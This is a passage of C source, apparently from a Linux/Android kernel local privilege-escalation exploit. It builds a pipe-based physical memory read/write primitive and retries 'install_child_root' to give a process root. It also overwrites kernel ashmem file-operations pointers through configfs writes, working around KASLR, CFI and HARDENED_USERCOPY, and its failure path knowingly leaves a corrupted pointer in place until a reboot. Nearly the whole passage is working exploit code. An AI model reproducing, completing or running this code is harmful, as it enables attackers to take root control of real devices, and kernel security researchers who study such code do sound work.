  pr_warning("pipe reclaim physrw diagnostic complete ok=%d idx=%d; "
             "root installation skipped\n",
             physrw_only_ok, pipebuf_pipe_idx);
#else
  int physrw_only_ok = run_pipe_reclaim_diagnostic(fd);
  pr_warning("pipe reclaim trace diagnostic complete found=%d idx=%d; "
             "physical read/write and root installation skipped\n",
             physrw_only_ok, pipebuf_pipe_idx);
#endif
#else
  int physrw_only_ok = install_pipe_physrw(fd);
  pr_warning("pipe physrw-only diagnostic complete ok=%d idx=%d; "
             "root installation skipped\n",
             physrw_only_ok, pipebuf_pipe_idx);
#endif
#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
  rmg_diag_checkpoint("pipe-physrw-only-done", physrw_only_ok,
                      pipebuf_pipe_idx);
#endif
  cfi_last_step = 38;
  cfi_last_errno = physrw_only_ok ? 0 : errno;
  goto fail;
#elif RMG_DIAG_PIPE_AFTER_CFI_CONTINUE
  /* Preserve the validated route-timed pipe preparation, then continue into
   * install_pipe_physrw(). That function must pass cache identity, unique
   * marker correlation, and scratch read/write proof before root installation
   * is reachable. */
  if (!pipebuf_page_base) {
#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
    rmg_diag_checkpoint("pipe-after-cfi-null-base", pipebuf_page_base,
                        pipebuf_pipe_idx);
#endif
    cfi_last_step = 39;
    cfi_last_errno = ENODATA;
    pr_error("route-timed pipe preparation returned no candidate page; "
             "aborting before the root path\n");
    goto fail;
  }
#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
  rmg_diag_checkpoint("pipe-after-cfi-continue", pipebuf_page_base,
                      pipebuf_pipe_idx);
#endif
  pr_info("route-timed pipe preparation complete base=%016zx; continuing "
          "through gated physrw and root path\n", pipebuf_page_base);
#else
  cfi_last_step = 37;
  cfi_last_errno = 0;
  pr_warning("route-timed pipe diagnostic complete base=%016zx; "
             "physical read/write and root stages skipped\n",
             pipebuf_page_base);
#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
  rmg_diag_checkpoint("pipe-after-cfi-done", pipebuf_page_base,
                      pipebuf_pipe_idx);
#endif
  goto fail;
#endif
#endif

  pr_info("cfi starting pipe physrw\n");

  int installed = 0;
  pipe_stage_attempts = 0;
  for (int attempt = 0; attempt < PIPE_MAX_ATTEMPTS; attempt++) {
    pipe_stage_attempts++;
    if (attempt != 0) {
      reset_pipe_attempt();
    }
    pr_info("pipe physrw attempt=%d/%d\n", attempt + 1,
            PIPE_MAX_ATTEMPTS);
    if (install_child_root(fd)) {
      installed = 1;
      break;
    }
    pr_warning("pipe physrw attempt=%d/%d failed\n", attempt + 1,
               PIPE_MAX_ATTEMPTS);
    if (pipe_cache_gate_ok && physrw_read_ok && physrw_write_ok &&
        physrw_read64_ok && physrw_write64_ok) {
      break;
    }
  }

  if (!installed) {
    cfi_last_step = 8;
    cfi_last_errno = errno;
    goto fail;
  }

#if !defined(APP_PHYS_P0_ORACLE) || !APP_PHYS_P0_ORACLE
  if (!restore_slide_boot_id_pipe(fd)) {
    cfi_last_step = 10;
    cfi_last_errno = errno;
    goto fail;
  }
#endif

  uint64_t original_fops = canon_addr(ASHMEM_FOPS);
  uintptr_t misc_fops_canon = canon_addr(ASHMEM_MISC_FOPS);
  pr_info("cfi restoring misc_fops canonical target=%016zx value=%016llx\n",
          misc_fops_canon, (unsigned long long)original_fops);
  cfi_restore_ret = configfs_write_once(
      fd, misc_fops_canon, &original_fops, sizeof(original_fops));
  if (cfi_restore_ret != (ssize_t)sizeof(original_fops)) {
    cfi_last_step = 5;
    cfi_last_errno = errno;
    goto fail;
  }
  fops_after = original_fops;

  uint64_t null_owner = 0;
  ssize_t owner =
    configfs_write_once(fd, fake_fops, &null_owner, sizeof(null_owner));
  cfi_owner_ret = owner;
  SYSCHK(close(fd));
  if (owner == (ssize_t)sizeof(null_owner)) {
    cfi_last_step = 0;
    cfi_last_errno = 0;
    atomic_store(&cfi_stage_done, 1);
#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
    rmg_diag_checkpoint("cfi-stage-success", cfi_attempts, owner);
#endif
    return 1;
  }
  cfi_last_step = 7;
  cfi_last_errno = errno;
#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
  rmg_diag_checkpoint("cfi-stage-owner-failed", cfi_last_step,
                      cfi_last_errno);
#endif
  return 0;

fail:
#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
  rmg_diag_checkpoint("cfi-stage-fail", cfi_last_step, cfi_last_errno);
#endif
  {
    uint64_t original_fops_fail = data_addr(ASHMEM_FOPS);
    if (kaslr_done) {
      original_fops_fail = canon_addr(ASHMEM_FOPS);
    }
    if (pipebuf_page_base && pipebuf_pipe_idx >= 0) {
      uintptr_t misc_fops_canon = canon_addr(ASHMEM_MISC_FOPS);
      cfi_restore_ret = configfs_write_once(
          fd, misc_fops_canon, &original_fops_fail,
          sizeof(original_fops_fail));
      if (cfi_restore_ret == (ssize_t)sizeof(original_fops_fail))
        fops_after = original_fops_fail;
    } else {
      /* HARDENED_USERCOPY rejects configfs writes into kernel .data and
       * panic_on_oops makes that fatal. Until pipe physrw exists, leave the
       * swapped global pointer in place. The caller keeps the backing page
       * alive until the required reboot. */
      cfi_restore_ret = -1;
    }
    uint64_t null_owner_fail = 0;
    cfi_owner_ret = configfs_write_once(
        fd, fake_fops, &null_owner_fail, sizeof(null_owner_fail));
  }
  SYSCHK(close(fd));
  return 0;
#endif
}
